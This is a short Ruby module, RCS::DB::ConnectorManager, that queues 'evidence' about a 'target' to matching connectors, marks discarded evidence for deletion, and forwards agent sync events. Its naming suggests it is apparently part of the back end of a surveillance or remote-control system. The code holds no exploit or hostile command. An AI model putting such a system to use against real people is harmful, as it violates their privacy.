require 'rcs-common/trace'
require_relative 'db_objects/connector_queue'

module RCS
  module DB
    module ConnectorManager
      extend RCS::Tracer
      extend self

      def process_evidence(target, evidence)
        connectors = ::Connector.enabled.select { |connector| connector.match?(evidence) }
        return :keep if connectors.blank?

        keep = keep_evidence?(connectors)

        unless keep
          evidence.update_attributes(destroy_countdown: connectors.size)
        end

        connectors.each do |connector|
          ConnectorQueue.push_evidence(connector, target, evidence)
        end

        keep ? :keep : :discard
      end

      def process_sync_event(agent, event, params = {})
        operation_id = agent.path.first

        ::Connector.enabled.where(type: 'REMOTE', path: [operation_id]).each do |connector|
          ConnectorQueue.push_sync_event(connector, event, agent, params)
        end
      end

      def keep_evidence?(connectors)
        if connectors.respond_to?(:where)
          connectors.where(keep: true).count > 0
        else
          connectors.each { |c| return true if c.keep }
          false
        end
      end
    end
  end
end
